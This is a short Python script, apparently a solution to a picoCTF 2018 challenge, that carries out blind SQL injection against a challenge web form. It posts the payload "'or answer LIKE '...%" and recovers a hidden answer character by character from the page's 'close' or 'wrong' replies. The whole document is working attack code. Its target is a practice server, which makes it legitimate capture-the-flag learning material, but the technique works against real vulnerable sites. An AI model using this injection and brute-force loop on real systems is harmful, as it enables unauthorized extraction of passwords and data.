#!/usr/local/bin/python3
import requests
import re
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

url = 'http://2018shell1.picoctf.com:2644/answer2.php'

password = '%'

while (6 < 7):
    for char in characters:
        data = {"answer": "'or answer LIKE '%s" % password.replace("%", char + "%")}
        print('trying password: ' + password.replace("%", char))
        response = requests.post(url, data=data)
        content = response.text
        condition = re.findall('<h1>(.*)</h1>', content)[0]
        if "close" in condition:
            password = password.replace("%", char + "%")
            print('password starts with %s' % password.replace("%", ""))
            break
    if "wrong" in condition:
        break

print(password.replace("%", ""))
